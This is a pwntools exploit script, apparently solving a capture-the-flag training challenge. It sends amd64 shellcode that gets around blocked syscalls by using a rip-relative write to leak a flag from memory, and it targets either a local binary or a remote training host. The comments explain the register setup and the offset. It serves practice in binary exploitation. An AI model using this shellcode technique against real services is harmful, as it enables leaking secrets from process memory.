from pwn import *

# asks for a string and executes it, but execve, open, read and write are blocked

# the * before the address means to gdb "address" (duh) instead of "symbol" (like the main function)
COMMANDS = """
b  main
c
"""
context.arch = "amd64"

# All the registers were put to 0, apart from rsp and rip:
# rsp was loaded with an unusable value
# the shellcode we are running is somewhere around 100 bytes upwards the end of the saved flag
# => loading rip to rsi (rsi represents the buffer from which the write takes the data) with lea rsi, [rip] and adjusting the offset to 124 (trial and error on remote connection) we can perform a write syscall (rax = 0x1), which will print the flag to the stdout (rdi = 0x1)
# to be safe, we write 100 bytes (rdx = 100)
shellcode = """
mov rax, 1
mov rdi, 1
lea rsi, [rip]
sub rsi, 124
mov rdx, 100
syscall
"""
hack = asm(shellcode)

if args.REMOTE:
    c = remote("lost-in-memory.training.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug("./lost_in_memory", gdbscript = COMMANDS)
    else:
        c = process("./lost_in_memory")

c.recvuntil(b"""I forgot where I put my flag :(
Can you help me recover it?
 > """)
c.send(hack)
c.interactive()